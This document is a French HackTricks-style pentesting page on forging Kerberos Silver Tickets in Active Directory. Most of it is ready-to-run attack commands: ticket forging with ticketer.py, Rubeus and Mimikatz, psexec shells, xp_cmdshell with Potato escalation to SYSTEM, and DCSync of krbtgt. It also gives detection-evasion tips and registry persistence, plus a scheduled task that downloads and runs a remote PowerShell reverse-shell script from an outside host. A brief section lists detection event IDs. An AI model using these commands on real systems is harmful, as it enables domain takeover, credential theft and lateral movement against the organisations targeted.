# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

L’attaque **Silver Ticket** implique l’exploitation de service tickets dans les environnements Active Directory (AD). Cette méthode repose sur **l’obtention du hash NTLM d’un compte de service**, tel qu’un compte d’ordinateur, afin de forger un Ticket Granting Service (TGS) ticket. Avec ce ticket forgé, un attaquant peut accéder à des services spécifiques du réseau en **usurpant l’identité de n’importe quel utilisateur**, avec pour objectif habituel d’obtenir des privilèges administratifs. Il est souligné que l’utilisation de clés AES pour forger des tickets est plus sûre et plus difficile à détecter.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Les Silver Tickets sont plus difficiles à détecter que les Golden Tickets, car ils nécessitent uniquement le **hash du compte de service**, et non celui du compte krbtgt. Cependant, ils sont limités au service spécifique qu’ils ciblent. De plus, il suffit de voler le mot de passe d’un utilisateur.
De plus, si vous compromettez le **mot de passe d’un compte avec un SPN**, vous pouvez utiliser ce mot de passe pour créer un Silver Ticket usurpant l’identité de n’importe quel utilisateur auprès de ce service.

### Changements modernes de Kerberos (domaines AES-only)

- Les mises à jour Windows à partir du **8 novembre 2022 (KB5021131)** définissent par défaut les service tickets avec des **clés de session AES** lorsque cela est possible et abandonnent progressivement RC4. Les DC devraient être livrés avec RC4 **désactivé par défaut d’ici la mi-2026**, de sorte que l’utilisation de hashes NTLM/RC4 pour les Silver Tickets échoue de plus en plus souvent avec `KRB_AP_ERR_MODIFIED`. Extrayez toujours les **clés AES** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) du compte de service ciblé.<sup>[[5]](#references)</sup>
- Si l’attribut `msDS-SupportedEncryptionTypes` du compte de service est limité à AES, vous devez forger le ticket avec `/aes256` ou `-aesKey` ; RC4 (`/rc4` ou `-nthash`) ne fonctionnera pas, même si vous possédez le hash NTLM.<sup>[[6]](#references)</sup>
- Les comptes gMSA/computer renouvellent leurs secrets tous les 30 jours ; récupérez la **clé AES actuelle** depuis LSASS, Secretsdump/NTDS ou via DCsync avant de forger le ticket.
- OPSEC : la durée de vie par défaut des tickets dans les tools est souvent de **10 ans** ; définissez des durées réalistes (par exemple, `-duration 600` minutes) afin d’éviter une détection fondée sur des durées de vie anormales.<sup>[[6]](#references)</sup>

Pour la création de tickets, différents tools sont utilisés selon le système d’exploitation :

### Sous Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Sous Windows
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Le service CIFS est mis en évidence comme une cible courante pour accéder au système de fichiers de la victime, mais d'autres services comme HOST et RPCSS peuvent également être exploités pour exécuter des tâches et des requêtes WMI.

### Exemple : service MSSQL (MSSQLSvc) + Potato vers SYSTEM

Si vous disposez du hash NTLM (ou de la clé AES) d'un compte de service SQL (par ex., sqlsvc), vous pouvez forger un TGS pour le SPN MSSQL et usurper l'identité de n'importe quel utilisateur auprès du service SQL. Ensuite, activez xp_cmdshell pour exécuter des commandes avec le compte de service SQL. Si ce token dispose de SeImpersonatePrivilege, utilisez un Potato pour élever les privilèges vers SYSTEM.<sup>[[4]](#references)</sup>
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Si le contexte obtenu dispose de SeImpersonatePrivilege (souvent le cas pour les comptes de service), utilisez une variante de Potato pour obtenir SYSTEM :
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Plus de détails sur l'abus de MSSQL et l'activation de xp_cmdshell :

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Vue d'ensemble des techniques Potato :

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Services disponibles

| Type de service                            | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Selon l'OS également :</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Dans certains cas, vous pouvez simplement demander : WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, également psexec       | CIFS                                                                       |
| Opérations LDAP, y compris DCSync          | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Avec **Rubeus**, vous pouvez **demander tous** ces tickets à l'aide du paramètre :

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624 : Ouverture de session du compte
- 4634 : Fermeture de session du compte
- 4672 : Ouverture de session administrateur
- **Aucun 4768/4769 préalable sur le DC** pour le même client/service est un indicateur courant de la présentation directe d'un TGS forgé au service.
- Une durée de vie anormalement longue du ticket ou un type de chiffrement inattendu (RC4 lorsque le domaine impose AES) ressort également dans les données 4769/4624.

## Persistence

Pour éviter que les machines ne renouvellent leur mot de passe tous les 30 jours, définissez `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ou définissez `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` sur une valeur supérieure à 30 jours afin d'indiquer la période de renouvellement à laquelle le mot de passe des machines doit être renouvelé.<sup>[[3]](#references)</sup>

## Abus des Service tickets

Dans les exemples suivants, imaginons que le ticket soit récupéré en usurpant le compte administrateur.

### CIFS

Avec ce ticket, vous pourrez accéder aux dossiers `C$` et `ADMIN$` via **SMB** (s'ils sont exposés) et copier des fichiers vers une partie du système de fichiers distant en faisant simplement quelque chose comme :
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Vous pourrez également obtenir un shell sur l’hôte ou exécuter des commandes arbitraires à l’aide de **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Avec cette autorisation, vous pouvez créer des tâches planifiées sur des ordinateurs distants et exécuter des commandes arbitraires:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Avec ces tickets, vous pouvez **exécuter WMI sur le système victime** :
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Trouvez **plus d’informations sur wmiexec** dans la page suivante :


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HÔTE + WSMAN (WINRM)

Avec un accès winrm à un ordinateur, vous pouvez **y accéder** et même obtenir un PowerShell :
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Consultez la page suivante pour découvrir **d'autres moyens de vous connecter à un hôte distant avec winrm** :

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Notez que **winrm doit être actif et en écoute** sur l'ordinateur distant pour y accéder.

### LDAP

Avec ce privilège, vous pouvez extraire la base de données du DC à l'aide de **DCSync** :
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**En savoir plus sur DCSync** sur la page suivante :


{{#ref}}
dcsync.md
{{#endref}}


## Références

- [1] [Kerberos : Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II) : Comment attaquer Kerberos ? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Processus de mot de passe du compte machine - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf : Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Kerberos hardening et dépréciation de RC4](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Options actuelles d’Impacket ticketer.py (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)

{{#include ../../banners/hacktricks-training.md}}
